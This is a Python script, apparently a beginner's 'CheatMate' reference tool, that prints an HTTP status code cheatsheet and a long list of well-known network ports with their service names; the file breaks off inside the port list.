import os
import sys
import time
import pyfiglet

#Copyright (c) 2023 "4K3YM4L"

#Permission is hereby granted, free of charge, to any person obtaining a copy of this tool and associated documentation files (the "Tool"), to deal in the Tool without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Tool, and to permit persons to whom the Tool is furnished to do so, subject to the following conditions:

#The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Tool.

#THE TOOL IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM

# Create the banner
banner = pyfiglet.figlet_format("CheatMate")
print(banner)


# Start
http = """
#HTTP Status Cheatsheet
----------------------

Informational Responses
#100	Continue
#101	Switching Protocols

Success Responses
#200	OK	
#201	Created	
#202	Accepted	
#203	Non-Authoritive Information	
#204	No Content	
#205	Reset Content	
#206	Partial Content	
#226	IM Used

Redirection Responses
#300	Multiple Choices	
#301	Moved Permanently	
#302	Found	
#303	See Other	
#304	Not Modified	
#305	Use Proxy	
#306	Switch Proxy	
#307	Temporary Redirect	
#308	Permanent Redirect

Server Error Responses
#500	Internal Server Error	
#501	Not Implemented	
#502	Bad Gateway	
#503	Service Unavailable	
#504	Gateway Timeout	
#505	HTTP Version Not Supported	
#506	Variant Also Negotiates	
#510	Not Extended	
#511	Network Authentication Required

Client Error Responses
#400	Bad Request	
#401	Unauthorized	
#402	Payment Required	
#403	Forbidden	
#404	Not Found	
#405	Method Not Allowed	
#406	Not Acceptable	
#407	Proxy Authentication Required	
#408	Request Timeout	
#409	Conflict	
#410	Gone	
#411	Length Required	
#412	Precondition Failed	
#413	Payload Too Large
#414	URI Too Long	
#415	Unsupported Media Type	
#416	Range Not Satisfiable	
#417	Expectation Failed	
#418	I’m a teapot	
#421	Misdirected Request	
#426	Upgrade Required	
#428	Precondition Required	
#429	Too Many Requests	
#431	Request Header Fields Too Large	
#451	Unavailable For Legal Reasons
"""
# Add red color to all text after "#"
http = http.replace("#", "\033[1;31m#\033[m")

port = """
All Port Cheatsheet

port 0 => - Reserved 
port 1 => tcpmux - TCP Port Service Multiplexer 
port 2 => compressnet - Management Utility 
port 3 => compressnet - Compression Process 
port 5 => rje - Remote Job Entry 
port 7 => echo - Echo 
port 9 => discard - Discard 
port 11 => systat - Active Users 
port 13 => daytime - Daytime (RFC 867) 
port 15 => netstat - Was Netstat 
port 17 => qotd - Quote of the Day 
port 18 => msp - Message Send Protocol 
port 19 => chargen - Character Generator 
port 20 => ftp-data - File Transfer [Default Data] 
port 21 => ftp - File Transfer [Control] 
port 22 => ssh - SSH Remote Login Protocol 
port 23 => telnet - Telnet 
port 24 => - any private mail system 
port 25 => smtp - Simple Mail Transfer 
port 27 => nsw-fe - NSW User System FE 
port 29 => msg-icp - MSG ICP 
port 31 => msg-auth - MSG Authentication 
port 33 => dsp - Display Support Protocol 
port 35 => - any private printer server 
port 37 => time - Time 
port 38 => rap - Route Access Protocol 
port 39 => rlp - Resource Location Protocol 
port 41 => graphics - Graphics 
port 42 => name - Host Name Server 
port 42 => nameserver - Host Name Server 
port 43 => nicname - Who Is 
port 44 => mpm-flags - MPM FLAGS Protocol 
port 45 => mpm - Message Processing Module [recv] 
port 46 => mpm-snd - MPM [default send] 
port 47 => ni-ftp - NI FTP 
port 48 => auditd - Digital Audit Daemon 
port 49 => tacacs - Login Host Protocol (TACACS) 
port 50 => re-mail-ck - Remote Mail Checking Protocol 
port 51 => la-maint - IMP Logical Address Maintenance 
port 52 => xns-time - XNS Time Protocol 
port 53 => domain - Domain Name Server 
port 54 => xns-ch - XNS Clearinghouse 
port 55 => isi-gl - ISI Graphics Language 
port 56 => xns-auth - XNS Authentication 
port 57 => - any private terminal access 
port 58 => xns-mail - XNS Mail 
port 59 => - any private file service 
port 61 => ni-mail - NI MAIL 
port 62 => acas - ACA Services 
port 63 => whois++ - whois++ 
port 64 => covia - Communications Integrator (CI) 
port 65 => tacacs-ds - TACACS-Database Service 
port 66 => sql*net - Oracle SQL*NET 
port 67 => bootps - Bootstrap Protocol Server 
port 68 => bootpc - Bootstrap Protocol Client 
port 69 => tftp - Trivial File Transfer 
port 70 => gopher - Gopher 
port 71 => netrjs-1 - Remote Job Service 
port 72 => netrjs-2 - Remote Job Service 
port 73 => netrjs-3 - Remote Job Service 
port 74 => netrjs-4 - Remote Job Service 
port 75 => - any private dial out service 
port 76 => deos - Distributed External Object Store 
port 77 => - any private RJE service 
port 78 => vettcp - vettcp 
port 79 => finger - Finger 
port 80 => http - World Wide Web HTTP 
port 80 => www - World Wide Web HTTP 
port 80 => www-http - World Wide Web HTTP 
port 81 => hosts2-ns - HOSTS2 Name Server 
port 82 => xfer - XFER Utility 
port 83 => mit-ml-dev - MIT ML Device 
port 84 => ctf - Common Trace Facility 
port 85 => mit-ml-dev - MIT ML Device 
port 86 => mfcobol - Micro Focus Cobol 
port 87 => - any private terminal link 
port 88 => kerberos - Kerberos 
port 89 => su-mit-tg - SU/MIT Telnet Gateway 
port 90 => dnsix - DNSIX Securit Attribute Token Map (or Pointcast (UNOFFICIALLY)) 
port 91 => mit-dov - MIT Dover Spooler 
port 92 => npp - Network Printing Protocol 
port 93 => dcp - Device Control Protocol 
port 94 => objcall - Tivoli Object Dispatcher 
port 95 => supdup - SUPDUP 
port 96 => dixie - DIXIE Protocol Specification 
port 97 => swift-rvf - Swift Remote Virtural File Protocol 
port 98 => tacnews - TAC News 
port 99 => metagram - Metagram Relay 
port 100 => newacct - [unauthorized use] 
port 101 => hostname - NIC Host Name Server 
port 102 => iso-tsap - ISO-TSAP Class 0 
port 103 => gppitnp - Genesis Point-to-Point Trans Net 
port 104 => acr-nema - ACR-NEMA Digital Imag. & Comm. 300 
port 105 => cso - CCSO name server protocol 
port 105 => csnet-ns - Mailbox Name Nameserver 
port 106 => 3com-tsmux - 3COM-TSMUX 
port 107 => rtelnet - Remote Telnet Service 
port 108 => snagas - SNA Gateway Access Server 
port 109 => pop2 - Post Office Protocol - Version 2 
port 110 => pop3 - Post Office Protocol - Version 3 
port 111 => sunrpc - SUN Remote Procedure Call 
port 112 => mcidas - McIDAS Data Transmission Protocol 
port 113 => ident - 113/tcp => auth - Authentication Service 
port 114 => audionews - Audio News Multicast 
port 115 => sftp - Simple File Transfer Protocol 
port 116 => ansanotify - ANSA REX Notify 
port 117 => uucp-path - UUCP Path Service 
port 118 => sqlserv - SQL Services 
port 119 => nntp - Network News Transfer Protocol 
port 120 => cfdptkt - CFDPTKT 
port 121 => erpc - Encore Expedited Remote Pro.Call 
port 122 => smakynet - SMAKYNET 
port 123 => ntp - Network Time Protocol 
port 124 => ansatrader - ANSA REX Trader 
port 125 => locus-map - Locus PC-Interface Net Map Ser 
port 126 => nxedit - NXEdit (previously assigned to unitary - Unisys Unitary Login) 
port 127 => locus-con - Locus PC-Interface Conn Server 
port 128 => gss-xlicen - GSS X License Verification 
port 129 => pwdgen - Password Generator Protocol 
port 130 => cisco-fna - cisco FNATIVE 
port 131 => cisco-tna - cisco TNATIVE 
port 132 => cisco-sys - cisco SYSMAINT 
port 133 => statsrv - Statistics Service 
port 134 => ingres-net - INGRES-NET Service 
port 135 => epmap - DCE endpoint resolution 
port 136 => profile - PROFILE Naming System 
port 137 => netbios-ns - NETBIOS Name Service 
port 138 => netbios-dgm - NETBIOS Datagram Service 
port 139 => netbios-ssn - NETBIOS Session Service 
port 140 => emfis-data - EMFIS Data Service 
port 141 => emfis-cntl - EMFIS Control Service 
port 142 => bl-idm - Britton-Lee IDM 
port 143 => imap - Internet Message Access Protocol 
port 144 => uma - Universal Management Architecture 
port 145 => uaac - UAAC Protocol 
port 146 => iso-tp0 - ISO-IP0 
port 147 => iso-ip - ISO-IP 
port 148 => jargon - Jargon 
port 149 => aed-512 - AED 512 Emulation Service 
port 150 => sql-net - SQL-NET 
port 151 => hems - HEMS  
port 152 => bftp - Background File Transfer Program  
port 153 => sgmp - SGMP 
port 154 => netsc-prod - NETSC 
port 155 => netsc-dev - NETSC 
port 156 => sqlsrv - SQL Service  
port 157 => knet-cmp - KNET/VM Command/Message Protocol 
port 158 => pcmail-srv - PCMail Server 
port 159 => nss-routing - NSS-Routing  
port 160 => sgmp-traps - SGMP-TRAPS 
port 161 => snmp - SNMP 
port 162 => snmptrap - SNMPTRAP 
port 163 => cmip-man - CMIP/TCP Manager  
port 164 => cmip-agent - CMIP/TCP Agent  
port 165 => xns-courier - Xerox 
port 166 => s-net - Sirius Systems 
port 167 => namp - NAMP 
port 168 => rsvd - RSVD  
port 169 => send - SEND  
port 170 => print-srv - Network PostScript 
port 171 => multiplex - Network Innovations Multiplex 
port 172 => cl/1 - Network Innovations CL/1  
port 173 => xyplex-mux - Xyplex 
port 174 => mailq - MAILQ 
port 175 => vmnet - VMNET 
port 176 => genrad-mux - GENRAD-MUX 
port 177 => xdmcp - X Display Manager Control Protocol 
port 178 => nextstep - NextStep Window Server  
port 179 => bgp - Border Gateway Protocol 
port 180 => ris - Intergraph 
port 181 => unify - Unify  
port 182 => audit - Unisys Audit SITP  
port 183 => ocbinder - OCBinder  
port 184 => ocserver - OCServer  
port 185 => remote-kis - Remote-KIS  
port 186 => kis - KIS Protocol 
port 187 => aci - Application Communication Interface 
port 188 => mumps - Plus Five's MUMPS  
port 189 => qft - Queued File Transport 
port 190 => gacp - Gateway Access Control Protocol 
port 191 => prospero - Prospero Directory Service 
port 192 => osu-nms - OSU Network Monitoring System  
port 193 => srmp - Spider Remote Monitoring Protocol  
port 194 => irc - Internet Relay Chat Protocol 
port 195 => dn6-nlm-aud - DNSIX Network Level Module Audit 
port 196 => dn6-smm-red - DNSIX Session Mgt Module Audit Redir 
port 197 => dls - Directory Location Service 
port 198 => dls-mon - Directory Location Service Monitor 
port 199 => smux - SMUX 
port 200 => src - IBM System Resource Controller 
port 201 => at-rtmp - AppleTalk Routing Maintenance  
port 202 => at-nbp - AppleTalk Name Binding 
port 203 => at-3 - AppleTalk Unused 
port 204 => at-echo - AppleTalk Echo 
port 205 => at-5 - AppleTalk Unused 
port 206 => at-zis - AppleTalk Zone Information 
port 207 => at-7 - AppleTalk Unused 
port 208 => at-8 - AppleTalk Unused 
port 209 => qmtp - The Quick Mail Transfer Protocol 
port 210 => z39.50 - ANSI Z39.50 
port 211 => 914c/g - Texas Instruments 914C/G Terminal 
port 212 => anet - ATEXSSTR  
port 213 => ipx - IPX 	  
port 214 => vmpwscs - VM PWSCS 
port 215 => softpc - Insignia Solutions 
port 216 => CAIlic - Computer Associates Int'l License Server 
port 217 => dbase - dBASE Unix 
port 218 => mpp - Netix Message Posting Protocol 
port 219 => uarps - Unisys ARPs  
port 220 => imap3 - Interactive Mail Access Protocol v3 
port 221 => fln-spx - Berkeley rlogind with SPX auth  
port 222 => rsh-spx - Berkeley rshd with SPX auth (possible conflict with Masqdialer) 
port 223 => cdc - Certificate Distribution Center 
port 224 => masqdialer - masqdialer 
port 225 => - Reserved 
port 226 => - Reserved 
port 227 => - Reserved 
port 228 => - Reserved 
port 229 => - Reserved 
port 230 => - Reserved 
port 231 => - Reserved 
port 232 => - Reserved 
port 233 => - Reserved 
port 234 => - Reserved 
port 235 => - Reserved 
port 236 => - Reserved 
port 237 => - Reserved 
port 238 => - Reserved 
port 239 => - Reserved 
port 240 => - Reserved 
port 241 => - Reserved 
port 242 => direct - Direct 
port 243 => sur-meas - Survey Measurement 
port 244 => dayna - Dayna 
port 245 => link - LINK 
port 246 => dsp3270 - Display Systems Protocol 
port 247 => subntbcst_tftp - SUBNTBCST_TFTP 
port 248 => bhfhs - bhfhs 
port 249 => - Reserved 
port 250 => - Reserved 
port 251 => - Reserved 
port 252 => - Reserved 
port 253 => - Reserved 
port 254 => - Reserved 
port 255 => - Reserved 
port 256 => rap - RAP 
port 257 => set - Secure Electronic Transaction 
port 258 => yak-chat - Yak Winsock Personal Chat 
port 259 => esro-gen - Efficient Short Remote Operations 
port 260 => openport - Openport 
port 261 => nsiiops - IIOP Name Service over TLS/SSL 
port 262 => arcisdms - Arcisdms 
port 263 => hdap - HDAP 
port 264 => bgmp - BGMP 
port 280 => http-mgmt - http-mgmt 
port 281 => personal-link - Personal Link 
port 282 => cableport-ax - Cable Port A/X 
port 283 => rescap - rescap 
port 308 => novastorbakcup - Novastor Backup 
port 309 => entrusttime - EntrustTime 
port 310 => bhmds - bhmds 
port 311 => asip-webadmin - AppleShare IP WebAdmin 
port 312 => vslmp - VSLMP 
port 313 => magenta-logic - Magenta Logic 
port 314 => opalis-robot - Opalis Robot 
port 315 => dpsi - DPSI 
port 316 => decauth - decAuth 
port 317 => zannet - Zannet 
port 318 => pkix-timestamp - PKIX TimeStamp 
port 319 => ptp-event - PTP Event 
port 320 => ptp-general - PTP General 
port 321 => pip - PIP 
port 322 => rtsps - RTSPS 
port 344 => pdap - Prospero Data Access Protocol 
port 345 => pawserv - Perf Analysis Workbench 
port 346 => zserv - Zebra server 
port 347 => fatserv - Fatmen Server 
port 348 => csi-sgwp - Cabletron Management Protocol 
port 349 => mftp - mftp 
port 350 => matip-type-a - MATIP Type A 
port 351 => matip-type-b - MATIP Type B 
port 351 => bhoetty - bhoetty 
port 352 => dtag-ste-sb - DTAG 
port 352 => bhoedap4 - bhoedap4  
port 353 => ndsauth - NDSAUTH 
port 354 => bh611 - bh611 
port 355 => datex-asn - DATEX-ASN 
port 356 => cloanto-net-1 - Cloanto Net 1 
port 357 => bhevent - bhevent 
port 358 => shrinkwrap - Shrinkwrap 
port 359 => tenebris_nts - Tenebris Network Trace Service 
port 360 => scoi2odialog - scoi2odialog 
port 361 => semantix - Semantix 
port 362 => srssend - SRS Send 
port 363 => rsvp_tunnel - RSVP Tunnel 
port 364 => aurora-cmgr - Aurora CMGR 
port 365 => dtk - DTK 
port 366 => odmr - ODMR 
port 367 => mortgageware - MortgageWare 
port 368 => qbikgdp - QbikGDP 
port 369 => rpc2portmap - rpc2portmap  
port 370 => codaauth2 - codaauth2 
port 371 => clearcase - Clearcase 
port 372 => ulistproc - ListProcessor 
port 373 => legent-1 - Legent Corporation 
port 374 => legent-2 - Legent Corporation 
port 375 => hassle - Hassle 
port 376 => nip - Amiga Envoy Network Inquiry Proto  
port 377 => tnETOS - NEC Corporation 
port 378 => dsETOS - NEC Corporation 
port 379 => is99c - TIA/EIA/IS-99 modem client 
port 380 => is99s - TIA/EIA/IS-99 modem server 
port 381 => hp-collector - hp performance data collector 
port 382 => hp-managed-node - hp performance data managed node 
port 383 => hp-alarm-mgr - hp performance data alarm manager 
port 384 => arns - A Remote Network Server System 
port 385 => ibm-app - IBM Application 
port 386 => asa - ASA Message Router Object Def. 
port 387 => aurp - Appletalk Update-Based Routing Pro. 
port 388 => unidata-ldm - Unidata LDM Version 4 
port 389 => ldap - Lightweight Directory Access Protocol 
port 390 => uis - UIS 
port 391 => synotics-relay - SynOptics SNMP Relay Port 
port 392 => synotics-broker - SynOptics Port Broker Port 
port 393 => dis - Data Interpretation System 
port 394 => embl-ndt - EMBL Nucleic Data Transfer 
port 395 => netcp - NETscout Control Protocol 
port 396 => netware-ip - Novell Netware over IP 
port 397 => mptn - Multi Protocol Trans. Net. 
port 398 => kryptolan - Kryptolan 
port 399 => iso-tsap-c2 - ISO Transport Class 2 Non-Control over TCP 
port 400 => work-sol - Workstation Solutions 
port 401 => ups - Uninterruptible Power Supply 
port 402 => genie - Genie Protocol 
port 403 => decap - decap 
port 404 => nced - nced 
port 405 => ncld - ncld 
port 406 => imsp - Interactive Mail Support Protocol 
port 407 => timbuktu - Timbuktu 
port 408 => prm-sm - Prospero Resource Manager Sys. Man. 
port 409 => prm-nm - Prospero Resource Manager Node Man. 
port 410 => decladebug - DECLadebug Remote Debug Protocol 
port 411 => rmt - Remote MT Protocol 
port 412 => synoptics-trap - Trap Convention Port 
port 413 => smsp - SMSP 
port 414 => infoseek - InfoSeek 
port 415 => bnet - BNet 
port 416 => silverplatter - Silverplatter 
port 417 => onmux - Onmux 
port 418 => hyper-g - Hyper-G 
port 419 => ariel1 - Ariel 
port 420 => smpte - SMPTE 
port 421 => ariel2 - Ariel 
port 422 => ariel3 - Ariel 
port 423 => opc-job-start - IBM Operations Planning and Control Start 
port 424 => opc-job-track - IBM Operations Planning and Control Track 
port 425 => icad-el - ICAD 
port 426 => smartsdp - smartsdp 
port 427 => svrloc - Server Location 
port 428 => ocs_cmu - OCS_CMU 
port 429 => ocs_amu - OCS_AMU 
port 430 => utmpsd - UTMPSD 
port 431 => utmpcd - UTMPCD 
port 432 => iasd - IASD 
port 433 => nnsp - NNSP 
port 434 => mobileip-agent - MobileIP-Agent 
port 435 => mobilip-mn - MobilIP-MN 
port 436 => dna-cml - DNA-CML  
port 437 => comscm - comscm 
port 438 => dsfgw - dsfgw 
port 439 => dasp - dasp 
port 440 => sgcp - sgcp 
port 441 => decvms-sysmgt - decvms-sysmgt 
port 442 => cvc_hostd - cvc_hostd 
port 443 => https - http protocol over TLS/SSL 
port 444 => snpp - Simple Network Paging Protocol [RFC1568] 
port 445 => microsoft-ds - Microsoft-DS 
port 446 => ddm-rdb - DDM-RDB 
port 447 => ddm-dfm - DDM-RFM 
port 448 => ddm-ssl - DDM-SSL 
port 449 => as-servermap - AS Server Mapper 
port 450 => tserver - TServer 
port 451 => sfs-smp-net - Cray Network Semaphore server 
port 452 => sfs-config - Cray SFS config server 
port 453 => creativeserver - CreativeServer 
port 454 => contentserver - ContentServer 
port 455 => creativepartnr - CreativePartnr 
port 456 => macon-tcp - macon-tcp 
port 457 => scohelp - scohelp 
port 458 => appleqtc - apple quick time 
port 459 => ampr-rcmd - ampr-rcmd 
port 460 => skronk - skronk 
port 461 => datasurfsrv - DataRampSrv 
port 462 => datasurfsrvsec - DataRampSrvSec 
port 463 => alpes - alpes 
port 464 => kpasswd - kpasswd 
port 466 => digital-vrc - digital-vrc 
port 467 => mylex-mapd - mylex-mapd 
port 468 => photuris - proturis 
port 469 => rcp - Radio Control Protocol 
port 470 => scx-proxy - scx-proxy 
port 471 => mondex - Mondex 
port 472 => ljk-login - ljk-login 
port 473 => hybrid-pop - hybrid-pop 
port 474 => tn-tl-w1 - tn-tl-w1 
port 475 => tcpnethaspsrv - tcpnethaspsrv 
port 476 => tn-tl-fd1 - tn-tl-fd1 
port 477 => ss7ns - ss7ns 
port 478 => spsc - spsc 
port 479 => iafserver - iafserver 
port 480 => iafdbase - iafdbase 
port 481 => ph - Ph service 
port 482 => bgs-nsi - bgs-nsi 
port 483 => ulpnet - ulpnet 
port 484 => integra-sme - Integra Software Management Environment 
port 485 => powerburst - Air Soft Power Burst 
port 486 => avian - avian 
port 487 => saft - saft Simple Asynchronous File Transfer 
port 488 => gss-http - gss-http 
port 489 => nest-protocol - nest-protocol 
port 490 => micom-pfs - micom-pfs 
port 491 => go-login - go-login 
port 492 => ticf-1 - Transport Independent Convergence for FNA 
port 493 => ticf-2 - Transport Independent Convergence for FNA 
port 494 => pov-ray - POV-Ray 
port 495 => intecourier - intecourier 
port 496 => pim-rp-disc - PIM-RP-DISC 
port 497 => dantz - dantz 
port 498 => siam - siam 
port 499 => iso-ill - ISO ILL Protocol 
port 500 => isakmp - isakmp 
port 501 => stmf - STMF 
port 502 => asa-appl-proto - asa-appl-proto 
port 503 => intrinsa - Intrinsa 
port 504 => citadel - citadel 
port 505 => mailbox-lm - mailbox-lm 
port 506 => ohimsrv - ohimsrv 
port 507 => crs - crs 
port 508 => xvttp - xvttp 
port 509 => snare - snare 
port 510 => fcp - FirstClass Protocol 
port 511 => passgo - PassGo 
port 512 => exec - remote process execution authentication performed using passwords and UNIX loppgin names 
port 513 => login - remote login a la telnet; automatic authentication performed based on priviledged port numbers and distributed data bases which identify "authentication domains" 
port 514 => shell - cmd like exec, but automatic authentication is performed as for login server 
port 515 => printer - spooler 
port 516 => videotex - videotex 
port 517 => talk - like tenex link, but across machine - unfortunately, doesn't use link protocol (this is actually just a rendezvous port from which a tcp connection is established) 
port 518 => ntalk - ntalk 
port 519 => utime - unixtime 
port 520 => efs - extended file name server 
port 521 => ripng - ripng 
port 522 => ulp - ULP 
port 523 => ibm-db2 - IBM-DB2 
port 524 => ncp - NCP 
port 525 => timed - timeserver 
port 526 => tempo - newdate 
port 527 => stx - Stock IXChange 
port 528 => custix - Customer IXChange 
port 529 => irc-serv - IRC-SERV 
port 530 => courier - rpc 
port 531 => conference - chat 
port 532 => netnews - readnews 
port 533 => netwall - for emergency broadcasts 
port 534 => mm-admin - MegaMedia Admin 
port 535 => iiop - iiop 
port 536 => opalis-rdv - opalis-rdv 
port 537 => nmsp - Networked Media Streaming Protocol 
port 538 => gdomap - gdomap 
port 539 => apertus-ldp - Apertus Technologies Load Determination 
port 540 => uucp - uucpd		 
port 541 => uucp-rlogin - uucp-rlogin 
port 542 => commerce - commerce 
port 543 => klogin - klogin 
port 544 => kshell - krcmd 
port 545 => appleqtcsrvr - appleqtcsrvr 
port 546 => dhcpv6-client - DHCPv6 Client 
port 547 => dhcpv6-server - DHCPv6 Server 
port 548 => afpovertcp - AFP over TCP 
port 549 => idfp - IDFP 
port 550 => new-rwho - new-who 
port 551 => cybercash - cybercash 
port 552 => deviceshare - deviceshare 
port 553 => pirp - pirp 
port 554 => rtsp - Real Time Stream Control Protocol 
port 555 => dsf - dsf (or Stealth Spy TROJAN) 
port 556 => remotefs - rfs server 
port 557 => openvms-sysipc - openvms-sysipc 
port 558 => sdnskmp - SDNSKMP 
port 559 => teedtap - TEEDTAP 
port 560 => rmonitor - rmonitord 
port 561 => monitor - monitor 
port 562 => chshell - chcmd 
port 563 => nntps - nntp protocol over TLS/SSL (was snntp) 
port 564 => 9pfs - plan 9 file service 
port 565 => whoami - whoami 
port 566 => streettalk - streettalk 
port 567 => banyan-rpc - banyan-rpc 
port 568 => ms-shuttle - microsoft shuttle 
port 569 => ms-rome - microsoft rome 
port 570 => meter - demon 
port 571 => meter - udemon 
port 572 => sonar - sonar 
port 573 => banyan-vip - banyan-vip 
port 574 => ftp-agent - FTP Software Agent System 
port 575 => vemmi - VEMMI 
port 576 => ipcd - ipcd 
port 577 => vnas - vnas 
port 578 => ipdd - ipdd 
port 579 => decbsrv - decbsrv 
port 580 => sntp-heartbeat - SNTP HEARTBEAT 
port 581 => bdp - Bundle Discovery Protocol 
port 582 => scc-security - SCC Security 
port 583 => philips-vc - Philips Video-Conferencing 
port 584 => keyserver - Key Server 
port 585 => imap4-ssl - IMAP4+SSL (use 993 instead) 
port 586 => password-chg - Password Change 
port 587 => submission - Submission 
port 588 => cal - CAL 
port 589 => eyelink - EyeLink 
port 590 => tns-cml - TNS CML 
port 591 => http-alt - FileMaker, Inc. - HTTP Alternate (see Port 80) 
port 592 => eudora-set - Eudora Set 
port 593 => http-rpc-epmap - HTTP RPC Ep Map 
port 594 => tpip - TPIP 
port 595 => cab-protocol - CAB Protocol 
port 596 => smsd - SMSD 
port 597 => ptcnameservice - PTC Name Service 
port 598 => sco-websrvrmg3 - SCO Web Server Manager 3 
port 599 => acp - Aeolon Core Protocol 
port 600 => ipcserver - Sun IPC server 
port 606 => urm - Cray Unified Resource Manager 
port 607 => nqs - nqs 
port 608 => sift-uft - Sender-Initiated/Unsolicited File Transfer  
port 609 => npmp-trap - npmp-trap 
port 610 => npmp-local - npmp-local 
port 611 => npmp-gui - npmp-gui 
port 612 => hmmp-ind - HMMP Indication 
port 613 => hmmp-op - HMMP Operation 
port 614 => sshell - SSLshell 
port 615 => sco-inetmgr - Internet Configuration Manager 
port 616 => sco-sysmgr - SCO System Administration Server 
port 617 => sco-dtmgr - SCO Desktop Administration Server 
port 618 => dei-icda - DEI-ICDA 
port 619 => digital-evm - Digital EVM 
port 620 => sco-websrvrmgr - SCO WebServer Manager 
port 621 => escp-ip - ESCP 
port 622 => collaborator - Collaborator 
port 623 => aux_bus_shunt - Aux Bus Shunt 
port 624 => cryptoadmin - Crypto Admin 
port 625 => dec_dlm - DEC DLM 
port 626 => asia - ASIA 
port 627 => passgo-tivoli - PassGo Tivoli 
port 628 => qmqp - QMQP 
port 629 => 3com-amp3 - 3Com AMP3 
port 630 => rda - RDA 
port 631 => ipp - IPP (Internet Printing Protocol) 
port 632 => bmpp - bmpp 
port 633 => servstat - Service Status update (Sterling Software) 
port 634 => ginad - ginad 
port 635 => rlzdbase - RLZ DBase 
port 636 => ldaps - ldap protocol over TLS/SSL (was sldap) 
port 637 => lanserver - lanserver 
port 638 => mcns-sec - mcns-sec 
port 639 => msdp - MSDP 
port 640 => entrust-sps - entrust-sps 
port 641 => repcmd - repcmd 
port 642 => esro-emsdp - ESRO-EMSDP V1.3 
port 643 => sanity - SANity 
port 644 => dwr - dwr 
port 645 => pssc - PSSC 
port 646 => ldp - LDP 
port 647 => dhcp-failover - DHCP Failover 
port 648 => rrp - Registry Registrar Protocol (RRP) 
port 649 => aminet - Aminet 
port 650 => obex - OBEX 
port 651 => ieee-mms - IEEE MMS 
port 652 => udlr-dtcp - UDLR_DTCP	 
port 653 => repscmd - RepCmd 
port 654 => aodv - AODV 
port 655 => tinc - TINC 
port 656 => spmp - SPMP 
port 657 => rmc - RMC 
port 658 => tenfold - TenFold 
port 659 => url-rendezvous - URL Rendezvous 
port 660 => mac-srvr-admin - MacOS Server Admin 
port 661 => hap - HAP 
port 662 => pftp - PFTP 
port 663 => purenoise - PureNoise 
port 666 => doom - doom Id Software (or mdqs or FTP TROJAN) 
port 667 => disclose - campaign contribution disclosures - SDR Technologies 
port 668 => mecomm - MeComm 
port 669 => meregister - MeRegister 
port 670 => vacdsm-sws - VACDSM-SWS 
port 671 => vacdsm-app - VACDSM-APP 
port 672 => vpps-qua - VPPS-QUA 
port 673 => cimplex - CIMPLEX 
port 674 => acap - ACAP 
port 675 => dctp - DCTP 
port 676 => vpps-via - VPPS Via 
port 677 => vpp - Virtual Presence Protocol  
port 678 => ggf-ncp - GNU Gereration Foundation NCP 
port 679 => mrm - MRM 
port 680 => entrust-aaas - entrust-aaas  
port 681 => entrust-aams - entrust-aams 
port 682 => xfr - XFR 
port 683 => corba-iiop - CORBA IIOP  
port 684 => corba-iiop-ssl - CORBA IIOP SSL 
port 685 => mdc-portmapper - MDC Port Mapper 
port 686 => hcp-wismar - Hardware Control Protocol Wismar 
port 687 => asipregistry - asipregistry 
port 688 => realm-rusd - REALM-RUSD 
port 704 => elcsd - errlog copy/server daemon 
port 705 => agentx - AgentX 
port 707 => borland-dsj - Borland DSJ 
port 709 => entrust-kmsh - Entrust Key Management Service Handler 
port 710 => entrust-ash - Entrust Administration Service Handler 
port 711 => cisco-tdp - Cisco TDP 
port 729 => netviewdm1 - IBM NetView DM/6000 Server/Client 
port 730 => netviewdm2 - IBM NetView DM/6000 send/tcp 
port 731 => netviewdm3 - IBM NetView DM/6000 receive/tcp 
port 741 => netgw - netGW 
port 742 => netrcs - Network based Rev. Cont. Sys. 
port 744 => flexlm - Flexible License Manager 
port 747 => fujitsu-dev - Fujitsu Device Control 
port 748 => ris-cm - Russell Info Sci Calendar Manager 
port 749 => kerberos-adm - kerberos administration 
port 750 => rfile - rfile 
port 751 => pump - pump 
port 752 => qrh - qrh 
port 753 => rrh - rrh 
port 754 => tell - send 
port 758 => nlogin - nlogin 
port 759 => con - con 
port 760 => ns - ns 
port 761 => rxe - rxe 
port 762 => quotad - quotad 
port 763 => cycleserv - cycleserv 
port 764 => omserv - omserv 
port 765 => webster - webster 
port 767 => phonebook - phone 
port 769 => vid - vid 
port 770 => cadlock - cadlock 
port 771 => rtip - rtip 
port 772 => cycleserv2 - cycleserv2 
port 773 => submit - submit 
port 774 => rpasswd - rpasswd 
port 775 => entomb - entomb 
port 776 => wpages - wpages 
port 777 => multiling-http - Multiling HTTP 
port 780 => wpgs - wpgs 
port 786 => concert - Concert 
port 787 => qsc - QSC 
port 800 => mdbs_daemon - mdbs_daemon 
port 801 => device - device 
port 810 => fcp-udp - FCP 
port 828 => itm-mcell-s - itm-mcell-s 
port 829 => pkix-3-ca-ra - PKIX-3 CA/RA 
port 873 => rsync - rsync 
port 886 => iclcnet-locate - ICL coNETion locate server 
port 887 => iclcnet_svinfo - ICL coNETion server info 
port 888 => accessbuilder - AccessBuilder (or cddbp - CD Database Protocol) 
port 900 => omginitialrefs - OMG Initial Refs 
port 911 => xact-backup - xact-backup 
port 989 => ftps-data - ftp protocol, data, over TLS/SSL 
port 990 => ftps - ftp protocol, control, over TLS/SSL 
port 991 => nas - Netnews Administration System 
port 992 => telnets - telnet protocol over TLS/SSL 
port 993 => imaps - imap4 protocol over TLS/SSL 
port 994 => ircs - irc protocol over TLS/SSL 
port 995 => pop3s - pop3 protocol over TLS/SSL (was spop3) 
port 996 => vsinet - vsinet 
port 997 => maitrd - maitrd 
port 998 => busboy - busboy 
port 999 => garcon - garcon 
port 999 => puprouter - puprouter 
port 1000 => cadlock - cadlock 
port 1008 => - Possibly used by Sun Solaris 
port 1010 => surf - surf 
port 1011 => - Reserved 
port 1012 => - Reserved 
port 1013 => - Reserved 
port 1014 => - Reserved 
port 1015 => - Reserved 
port 1016 => - Reserved 
port 1017 => - Reserved 
port 1018 => - Reserved 
port 1019 => - Reserved 
port 1020 => - Reserved 
port 1021 => - Reserved 
port 1022 => - Reserved 
port 1023 => - Reserved 
port 1024 => - Reserved		 
port 1025 => blackjack - network blackjack 
port 1027 => icq - ICQ 
port 1029 => icq - ICQ 
